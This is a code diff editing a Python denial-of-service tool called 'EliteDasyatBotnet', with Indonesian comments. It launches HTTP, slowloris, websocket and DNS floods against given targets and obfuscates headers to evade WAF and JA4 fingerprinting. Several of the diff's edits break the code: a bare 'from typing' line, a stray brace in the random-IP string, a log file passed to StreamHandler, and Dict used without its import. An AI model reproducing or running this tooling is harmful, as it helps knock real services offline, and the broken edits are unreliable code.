@@ -2,27 +2,28 @@ import asyncio
 import aiohttp
 import random
 import uuid
+import os
+import hashlib
 import logging
 import base64
-import hashlib
+import time
 import socket
 import dns.resolver
 import ssl
-import time
 import websocket
 from fake_useragent import UserAgent
-from typing import Dict, List
+from typing
 import argparse
 
 # Logging Setup
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.StreamHandler(), logging.FileHandler("elite_dasyat_botnet.log")]
+    handlers=[logging.StreamHandler("elite_dasyat_botnet.log"), logging.StreamHandler()]
 )
 
 class EliteDasyatBotnet:
-    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: List[str] = None):
+    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: typing.List[str] = None):
         self.target_l7 = target_l7.rstrip('/') if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
         self.duration = duration
@@ -49,18 +50,18 @@ class EliteDasyatBotnet:
         self.active_connections = 0
 
     def _random_ip(self) -> str:
-        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-
+        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}}"
+    
     def _generate_polymorphic_payload(self, size: int = 128) -> bytes:
         """Polymorphic payload ringan pake hash dan UUID."""
         base = str(uuid.uuid4()).encode() + str(time.time()).encode()
         return base64.b64encode(hashlib.sha256(base + os.urandom(8)).digest())[:size]
-
+    
     def _generate_proof(self, data: bytes) -> str:
-        """Simple hash-based proof untuk verifikasi serangan."""
+        """Simple hash-based proof."""
         return hashlib.sha256(data + str(time.time()).encode()).hexdigest()[:16]
 
-    def _obfuscate_headers(self) -> Dict:
+    def _obfuscate_headers(self) -> Dict[str, str]:
         """Obfuscate headers untuk bypass WAF dan JA4 fingerprint."""
         headers = self.headers.copy()
         headers["User-Agent"] = self.ua.random
@@ -237,7 +238,7 @@ class EliteDasyatBotnet:
         }
         for method in self.methods:
             if method in method_tasks:
-                tasks.extend([method_tasks[method]() for _ in range(int(self.max_connections * (0.4 if method == "http" else 0.15 if method in ["slowloris", "websocket", "dns"] else 0.1))])
+                tasks.extend([method_tasks[method]() for _ in range(int(self.max_connections * (0.4 if method == "http" else 0.15 if method in ["slowloris", "websocket", "dns"] else 0.1)))])
         if not tasks:
             logging.error("No valid methods selected")
             return
@@ -246,7 +247,7 @@ class EliteDasyatBotnet:
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
         logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
-async def main(target_l7: str, target_l4: str, duration: int, methods: List[str]):
+async def main(target_l7: str, target_l4: str, duration: int, methods: typing.List[str]):
     botnet = EliteDasyatBotnet(target_l7, target_l4, duration, methods=methods)
     await botnet.run()
 
